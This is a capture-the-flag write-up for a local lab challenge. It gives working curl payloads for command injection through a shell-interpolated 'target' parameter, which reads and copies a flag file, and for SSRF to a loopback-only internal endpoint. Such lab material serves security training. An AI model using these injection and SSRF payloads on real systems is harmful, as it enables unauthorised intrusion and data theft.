# Challenge 2 Writeup

Base URL: `http://challenge2.localhost`

## c2-1: Remote Code Execution

`target` is interpolated into `python3 <diag.py> {target}` under `shell=True`. The diagnostic script allowlist does not prevent shell command chaining.

```bash
curl -G "http://challenge2.localhost/api/diag/run/" \
  --data-urlencode "target=api; cat /app/flag.txt"
```

The preview truncates the output. Copy the file under static and fetch it to read the complete flag:

```bash
curl -G "http://challenge2.localhost/api/diag/run/" \
  --data-urlencode "target=api; cp /app/flag.txt /app/static/f.txt"
curl "http://challenge2.localhost/static/f.txt"
```

## c2-2: SSRF

The webhook tester fetches `url` server-side without an allowlist. Request the loopback-only metrics endpoint:

```bash
curl -G "http://challenge2.localhost/webhooks/test/" \
  --data-urlencode "url=http://127.0.0.1:8000/internal/oncall-metrics/"
```

The response contains the second flag.

## Notes

- Both apps expose hints at `/api/hints/`.
- Submit each `FLAG{...}` independently.
- Flags are reseeded from `TEAM_FLAGS` on restart.
